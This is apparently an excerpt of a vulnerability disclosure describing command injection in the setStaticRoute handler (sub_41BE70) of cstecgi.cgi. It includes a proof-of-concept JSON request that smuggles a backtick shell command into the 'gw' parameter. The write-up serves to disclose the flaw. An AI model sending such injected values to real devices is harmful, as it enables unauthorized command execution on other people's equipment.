...
The vulnerability is located in the function `sub_41BE70` within `cstecgi.cgi`, also known as `setStaticRoute`.

![](Pasted%20image%2020231129163729.png)
...
therefore , by controlling parameter among  `gw,mask,iface,desc` , we can finally make an arbitrary command execution
...
{"gw":"`id > /1.txt;`","topicurl":"setStaticRoute","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231129163938.png)